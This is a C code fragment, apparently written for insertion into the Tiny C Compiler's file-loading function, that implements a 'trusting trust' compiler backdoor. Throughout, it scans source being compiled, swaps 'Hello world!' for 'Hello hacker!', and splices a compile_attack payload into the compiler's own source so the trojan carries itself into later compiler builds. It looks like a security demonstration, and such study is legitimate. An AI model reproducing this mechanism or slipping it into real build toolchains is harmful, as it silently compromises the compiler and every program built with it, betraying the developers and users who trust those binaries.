/* entrypoint in ST_FUNC int tcc_add_file_internal(TCCState *s1, const char *filename, int flags) */
#include "attack-array.h"
#define N 8 * 1024 * 1024

static char compile_sig[] = "/* open the file */";
static char hello_sig[] = "Hello world!";
static char hello_attack[] = "Hello hacker!";
int target_fd, n_read;
char* hello_i;
char* compile_i;
static char program[N+1]; 
static char tmp[N+1];
FILE* tmp_fptr;
for (size_t i = 0; i < N; i++){program[i] = 0;}


target_fd = open(filename, O_RDONLY);

if((n_read = read(target_fd, program, N)) < 1)
    printf("invalid read of file <%s>\n", filename);
if(n_read == N)
    printf("input file too large\n");

close(target_fd);

hello_i = strstr(program, hello_sig);
if(hello_i != NULL){
    printf("found hello world signature!\n");
    for (size_t i = 0; i < N; i++){tmp[i] = 0;}
    size_t hello_offset = hello_i - program + strlen(hello_sig);
    strcpy(tmp, program + hello_offset);
    strcpy(hello_i, hello_attack);
    strcpy(hello_i + strlen(hello_attack), tmp);
    /*tmp_fptr = fopen("./tmp.c", "w");
    if(tmp_fptr != NULL){
        fprintf(tmp_fptr, "%s", program);
        fclose(tmp_fptr);
    }
    filename="./tmp.c";*/
    int pipefd[2];
    if (pipe(pipefd) == 0) {
        dup2(pipefd[0], STDIN_FILENO);
        write(pipefd[1], program, strlen(program));
        close(pipefd[0]);
        close(pipefd[1]);
        filename = "-";
    }
}
    
compile_i = strstr(program, compile_sig);
if(compile_i != NULL){
    printf("found compile signature in <%s>!\n", filename);
    for (size_t i = 0; i < N; i++){tmp[i] = 0;}
    size_t compile_offset = compile_i - program + strlen(compile_sig);
    strcpy(tmp, program + compile_offset);
    strcpy(program + compile_offset, compile_attack);
    strcpy(program + compile_offset + strlen(compile_attack), tmp);
    tmp_fptr = fopen("./tmp.c", "w");
    if(tmp_fptr != NULL){
        fprintf(tmp_fptr, "%s", program);
        fclose(tmp_fptr);
        filename="./tmp.c";
    }
}
